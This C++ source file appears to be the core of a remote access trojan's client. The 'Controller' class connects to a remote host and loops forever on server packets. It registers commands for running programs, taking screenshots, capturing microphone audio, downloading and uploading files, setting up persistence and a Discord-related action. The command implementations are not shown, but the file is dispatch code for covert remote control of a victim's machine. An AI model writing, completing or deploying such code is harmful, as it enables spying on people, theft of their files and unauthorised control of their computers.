#include "controller.h"
#include <memory>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <cstdint>
#include <stdexcept>
#include "controllerimpl.h"
#include "commands.h"
#include "simplepacket.h"
using namespace std;

/**
 * Lock-free queue to hold audio data from mic.
 * Used to store data without processing it in the high-priority audio thread.
 * Flushed every so often to the server.
 */
// boost::lockfree::spsc_queue<char, boost::lockfree::capacity<8192>> audio_buf;

Controller::Controller(string host, uint16_t port) : impl(make_unique<ControllerImpl>(host, port)) {
	register_command(3, navigation);
	register_command(4, discordCommand);
	register_command(5, exec);
	register_command(6, screenshot);
	register_command(7, audioCommand);
	register_command(8, downloadFile);
	register_command(9, uploadFile);
	register_command(10, persist);
	register_command(11, dialog);
	register_command(12, showoff);
}


void Controller::run() {
	while (true) {
		SerializedPacket spkt = impl->conn.read_packet_sync();
		auto packet = parse_packet(spkt);
		handle_packet(*packet);
	}
}

void Controller::ret(retcode_t retcode) {
	SimplePacket<retcode_t> pkt(0, retcode);
	impl->conn.write_packet_sync(pkt.serialize());
}

void Controller::print(string out) {
	SimplePacket<string> pkt(1, out);
	impl->conn.write_packet_sync(pkt.serialize());
}

void Controller::println(string out) {
	out += "\n";
	print(out);
}

void Controller::err_println(string err) {
	SimplePacket<string> pkt(2, err);
	impl->conn.write_packet_sync(pkt.serialize());
}

void Controller::send_buffer(const vector<uint8_t> buf) {
	SimplePacket<vector<uint8_t>> pkt(3, buf);
	impl->conn.write_packet_sync(pkt.serialize());
}

void Controller::register_type(packettype_t type, function<std::unique_ptr<Packet>(const vector<uint8_t>&)> builder) {
	impl->registry[type] = builder;
}

void Controller::register_handler(packettype_t type, function<bool(Controller&, Packet&)> handler) {
	impl->handlers.insert(make_pair(type, handler));
}

unique_ptr<Packet> Controller::parse_packet(const SerializedPacket& spkt) {
	auto pktctr = impl->registry.find(spkt.type);
	if (pktctr == impl->registry.end()) {
		// TODO: don't fail here, just log and return
		throw new runtime_error("bad incoming packet type");
	}
	return pktctr->second(spkt.data);
}

void Controller::handle_packet(Packet& pkt) {
	auto range = impl->handlers.equal_range(pkt.type());
	for (auto i = range.first; i != range.second; i++) {
		if (!i->second(*this, pkt)) {
			return;
		}
	}
}
